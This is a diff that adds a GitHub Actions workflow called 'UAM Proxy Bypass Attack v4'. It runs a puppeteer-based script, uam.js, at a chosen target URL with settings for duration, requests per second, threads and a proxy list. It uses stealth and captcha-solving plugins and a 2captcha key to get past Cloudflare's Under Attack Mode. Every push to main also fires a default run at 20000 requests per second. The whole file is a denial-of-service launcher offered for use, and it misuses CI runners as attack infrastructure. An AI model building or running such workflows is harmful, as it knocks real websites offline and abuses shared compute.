@@ -1,0 +1,59 @@
+name: UAM Proxy Bypass Attack v4
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target URL'
+        required: true
+        type: string
+      time:
+        description: 'Attack duration in seconds'
+        required: true
+        type: number
+      rps:
+        description: 'Requests per second'
+        required: true
+        type: number
+      threads:
+        description: 'Number of threads'
+        required: true
+        type: number
+      proxy_file:
+        description: 'Name of proxy file in repository'
+        required: true
+        type: string
+        default: 'proxy.txt'
+  push:
+    branches: [ main ]
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest v4
+    
+    steps:
+    - name: Checkout code v4
+      uses: actions/checkout@v4
+      
+    - name: Setup Node.js v4
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+        
+    - name: Install dependencies v4
+      run: |
+        npm install puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-extra-plugin-recaptcha puppeteer-cluster
+        
+    - name: Run UAM attack v4
+      run: |
+        node uam.js ${{ inputs.target }} ${{ inputs.time }} ${{ inputs.rps }} ${{ inputs.threads }} ${{ inputs.proxy_file }}
+      env:
+        YOUR_2CAPTCHA_API_KEY: ${{ secrets.CAPTCHA_API_KEY }}
+      if: ${{ github.event_name == 'workflow_dispatch' }}
+      
+    - name: Run default attack v4
+      run: |
+        node uam.js https://example.com 60 20000 10 proxy.txt
+      env:
+        YOUR_2CAPTCHA_API_KEY: ${{ secrets.CAPTCHA_API_KEY }}
+      if: ${{ github.event_name != 'workflow_dispatch' }}
